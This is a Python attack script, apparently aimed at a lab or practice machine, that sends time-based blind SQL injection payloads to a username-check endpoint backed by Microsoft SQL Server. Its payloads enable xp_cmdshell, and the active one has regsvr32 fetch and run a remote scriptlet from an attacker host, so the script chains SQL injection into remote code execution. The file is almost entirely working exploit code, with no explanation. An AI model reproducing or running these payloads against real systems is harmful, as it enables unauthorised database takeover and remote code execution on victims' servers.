import requests
import time

def send_request(payload):
    url = "http://10.129.204.197/api/check-username.php"
    params = {"u": payload}
    headers = {
        "Host": "10.129.204.197",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Referer": "http://10.129.204.197/signup.php",
        "Priority": "u=0"
    }

    # Proxy setup
    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080",
    }

    # Disable SSL verification
    response = requests.get(url, headers=headers, params=params, proxies=proxies, verify=False)
    return response

def check_delay(payload):
    start_time = time.time()
    response = send_request(payload)
    end_time = time.time()

    delay = end_time - start_time
    if delay > 10:
        print(f"Payload successful: {payload}")
    else:
        print(f"Payload failed: {payload}")

# Payloads to check
payloads = [
    # "test'; if(1=1) waitfor delay '0:0:10'-- -",
    # "test'; if(IS_SRVROLEMEMBER('sysadmin')=1) waitfor delay '0:0:10'--",
    # "test'; EXEC sp_configure 'Show Advanced Options', '1'; waitfor delay '0:0:10'--",
    # "test'; RECONFIGURE; waitfor delay '0:0:10'--",
    # "test'; EXEC sp_configure 'xp_cmdshell', '1'; waitfor delay '0:0:10'--",
    # "test'; RECONFIGURE; waitfor delay '0:0:10'-- -",
    # "test'; EXEC xp_cmdshell \"ping /n 5 10.10.14.195\"; WAITFOR DELAY '0:0:10';--",
    "test'; exec xp_cmdshell 'cmd /c \"regsvr32 /s /n /u /i:http://10.10.14.195/4gP1HLAAOc6.sct scrobj.dll\"'; --",
]

# Test each payload
for payload in payloads:
    print(f"Testing payload: {payload}")
    check_delay(payload)
